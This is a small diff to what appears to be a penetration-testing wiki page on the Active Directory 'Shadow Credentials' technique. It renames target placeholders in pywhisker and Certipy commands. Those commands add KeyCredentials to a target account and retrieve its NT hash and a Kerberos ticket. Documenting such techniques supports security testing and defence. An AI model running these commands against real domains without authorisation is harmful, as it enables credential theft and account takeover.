@@ -35,13 +35,13 @@ From UNIX-like systems, the `msDs-KeyCredentialLink` attribute of a user or comp
 
 ```bash
 #List all curent KeyCredentials 
-pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_NAME" --action "list"
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "list"
 
 #Add a new KeyCredential to the target msDs-KeyCredentialLink attribute
-pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_NAME" --action "add" -P "YOUR_PFX_CERT_PASSWORD"
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "add" -P "YOUR_PFX_CERT_PASSWORD"
 
 #Remove a KeyCredential from the target msDs-KeyCredentialLink attribute
-pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_NAME" --action "remove" -D "DEVICE_ID"
+pywhisker.py -d "FQDN_DOMAIN" -u "USER" -p "PASSWORD" --target "TARGET_SAMNAME" --action "remove" -D "DEVICE_ID"
 ```
 
 {% hint style="info" %}
@@ -57,7 +57,7 @@ When the public key has been set in the `msDs-KeyCredentialLink` of the target, 
 [Certipy](https://github.com/ly4k/Certipy) (python) can automate the process. It will add a new Key Credential to the target account, authenticate with the Key Credential to retrieve the NT hash and a TGT for the target, and finally restore the old Key Credential attribute.
 
 ```bash
-certipy.py shadow auto -u "USERNAME" -p "PASSWORD" -account "TARGET_ACCOUNT_NAME" -target "TARGET_IP"
+certipy.py shadow auto -u "USERNAME" -p "PASSWORD" -account "TARGET_SAMNAME" -target "TARGET_IP"
 ```
 {% endtab %}
 
